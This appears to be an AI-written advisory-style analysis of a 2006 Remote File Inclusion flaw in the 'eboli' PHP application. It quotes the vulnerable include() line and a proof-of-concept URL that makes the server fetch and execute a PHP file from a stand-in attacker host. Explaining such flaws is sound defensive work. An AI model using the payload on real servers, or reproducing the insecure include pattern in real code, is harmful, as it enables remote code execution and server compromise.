Based on the provided content, here's a breakdown of the vulnerability:

**Root Cause:**
The vulnerability stems from the `include()` function in the `index.php` script of the "eboli" application. Specifically, the application uses the `$_GET['contentSpecial']` parameter in an insecure way by directly passing the user-supplied value to the `include()` function.

**Weaknesses/Vulnerabilities:**
- **Remote File Inclusion (RFI):** The primary vulnerability is RFI due to the direct use of user-controlled input in the `include()` function.  This allows an attacker to specify a remote URL containing malicious PHP code.
- **Lack of Input Sanitization:** The code does not validate or sanitize the `contentSpecial` parameter, making it vulnerable.

**Impact of Exploitation:**
- **Remote Code Execution (RCE):** By including a remote file containing malicious PHP code, an attacker can execute arbitrary code on the server.
- **Complete System Compromise:**  Successful exploitation could lead to full control of the affected server, allowing data theft, malware installation, or denial of service.

**Attack Vectors:**
- **HTTP GET Parameter Manipulation:** Attackers can exploit this vulnerability by crafting malicious URLs. The attack vector is through `index.php?contentSpecial=<malicious_url>&content=`.
   - The `content` parameter is needed as a trigger for the vulnerable code but its value is not used, only its existence is validated.

**Required Attacker Capabilities/Position:**
- **Network Access:** The attacker needs to be able to send HTTP requests to the vulnerable server.
- **Knowledge of the Vulnerable Script:** The attacker needs to know the location of the vulnerable `index.php` and the specific vulnerable parameters, which is generally available in the referenced PoC.
- **Remote File Hosting:** The attacker requires a server to host the malicious PHP file that will be included on the vulnerable server.

**Additional Details:**
- The provided content includes a Proof of Concept (PoC) URL demonstrating the vulnerability: `http://x.com/index.php?contentSpecial=http://hack.c/back.txt?&content` which clearly shows the injection point using the vulnerable GET parameter.
- The code that allows the exploitation is `if(isset($_GET['contentSpecial']) && isset($_GET['content'])){ include($_GET['contentSpecial']); }`
- The vulnerability is located in line 45 of `index.php` of the eboli application.
- The content also shows the vulnerable application can be downloaded from `http://www.jhjgubbels.nl/eboli/eboli.tar.gz`.
- The vulnerability was initially reported in the milw0rm.com database in 2006-10-10, and is related to multiple php scripts in the eboli app, according to the included comment.
